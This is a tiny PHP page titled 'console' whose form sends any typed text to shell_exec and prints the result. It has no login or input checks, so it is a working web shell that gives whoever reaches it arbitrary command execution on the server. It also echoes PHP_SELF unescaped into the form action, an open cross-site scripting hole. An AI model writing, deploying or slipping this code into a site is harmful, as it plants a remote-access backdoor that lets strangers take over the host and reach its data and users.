<html lang="ru">

<head>
    <title>console</title>
</head>

<body style="font-size: 2em">

<form action="<?php echo $_SERVER['PHP_SELF']; ?>" method="post">
    Enter command: <input type="text" name="code" />
    <input type="submit" />
</form>

<?php if(!empty($_POST['code'])) {

      echo shell_exec($_POST['code']);
  }
?>

</body>
</html>

